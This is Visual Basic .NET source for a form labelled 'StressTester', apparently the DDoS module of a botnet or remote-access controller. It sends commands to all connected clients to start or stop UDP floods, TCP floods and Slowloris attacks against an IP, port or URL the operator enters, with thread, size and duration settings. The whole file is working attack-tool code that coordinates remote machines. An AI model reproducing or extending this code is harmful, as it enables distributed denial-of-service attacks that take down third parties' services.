Imports ComponentOwl.BetterListView
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class StressTester
    Public Sub New()
        Me.clients = New ArrayList
        Me.packer = New LuxNET.Pack
        Me.sending = False
        Me.InitializeComponent()
    End Sub

    Private Sub btn_start2_Click(sender As Object, e As EventArgs) Handles btn_start2.Click
        Me.sending = True
        Me.SendPacket(New Object() {CByte(&H48), Me.tb_ipudp.Text, Convert.ToInt32(Me.tb_portudp.Value), Convert.ToInt32(Me.NUD_AOT_UDP.Value)})
        Me.btn_stop2.Enabled = True
        Me.btn_start2.Enabled = False
        Me.btn_startsl.Enabled = False
        Me.btn_starttcp.Enabled = False
    End Sub

    Private Sub btn_startsl_Click(sender As Object, e As EventArgs) Handles btn_startsl.Click
        Me.sending = True
        Me.SendPacket(New Object() {CByte(70), Me.tb_slurl.Text, Convert.ToInt32(Me.NUD_AoS_Sl.Value), Convert.ToInt32(Me.NUD_AOT_SL.Value)})
        Me.btn_stopsl.Enabled = True
        Me.btn_startsl.Enabled = False
        Me.btn_start2.Enabled = False
        Me.btn_starttcp.Enabled = False
    End Sub

    Private Sub btn_starttcp_Click(sender As Object, e As EventArgs) Handles btn_starttcp.Click
        Me.sending = True
        Me.SendPacket(New Object() {CByte(&H5E), Me.tb_tcp_ip.Text, Convert.ToInt32(Me.nud_tcp_size.Value), Convert.ToInt32(Me.nud_tcp_threads.Value)})
        Me.btn_startsl.Enabled = False
        Me.btn_stoptcp.Enabled = True
        Me.btn_start2.Enabled = False
        Me.btn_starttcp.Enabled = False
    End Sub

    Private Sub btn_stop2_Click(sender As Object, e As EventArgs) Handles btn_stop2.Click
        Me.sending = False
        Me.SendPacket(New Object() {CByte(&H49)})
        Me.btn_stop2.Enabled = False
        Me.btn_start2.Enabled = True
        Me.btn_startsl.Enabled = True
        Me.btn_starttcp.Enabled = True
    End Sub

    Private Sub btn_stopsl_Click(sender As Object, e As EventArgs) Handles btn_stopsl.Click
        Me.sending = False
        Me.SendPacket(New Object() {CByte(&H47)})
        Me.btn_stopsl.Enabled = False
        Me.btn_startsl.Enabled = True
        Me.btn_start2.Enabled = True
        Me.btn_starttcp.Enabled = True
    End Sub

    Private Sub btn_stoptcp_Click(sender As Object, e As EventArgs) Handles btn_stoptcp.Click
        Me.sending = False
        Me.SendPacket(New Object() {CByte(&H5F)})
        Me.btn_stoptcp.Enabled = False
        Me.btn_start2.Enabled = True
        Me.btn_startsl.Enabled = True
        Me.btn_starttcp.Enabled = True
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Dim num2 As Integer = (Me.clients.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            If Me.sending Then
                Me.client = DirectCast(Me.clients.Item(i), ServerClient)
                Me.client.Send(data)
                Me.LV_Clients.Items.Item(i).SubItems.Item(1).Text = ("Sending...")
                Me.LV_Clients.Items.Item(i).SubItems.Item(1).ImageIndex = (1)
            Else
                Me.client = DirectCast(Me.clients.Item(i), ServerClient)
                Me.client.Send(data)
                Me.LV_Clients.Items.Item(i).SubItems.Item(1).Text = ("Stopped...")
                Me.LV_Clients.Items.Item(i).SubItems.Item(1).ImageIndex = (-1)
            End If
            i += 1
        Loop
    End Sub

    Private Sub StressTester_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim num2 As Integer = (Me.clients.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            Me.LV_Clients.Items.Add(NewLateBinding.LateGet(NewLateBinding.LateGet(Me.clients.Item(i), Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString, 0).SubItems.Add("Idle...")
            i += 1
        Loop
        Me.StatusBar1.Text = ("Connected Clients:" & Conversions.ToString(Me.LV_Clients.Items.Count))
    End Sub

    Private client As ServerClient
    Public clients As ArrayList
    Private packer As LuxNET.Pack
    Private sending As Boolean

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        StartSlowLoris = 70
        StartTCP = &H5E
        StartUDP = &H48
        StopSlowloris = &H47
        StopTCP = &H5F
        StopUDP = &H49
    End Enum
End Class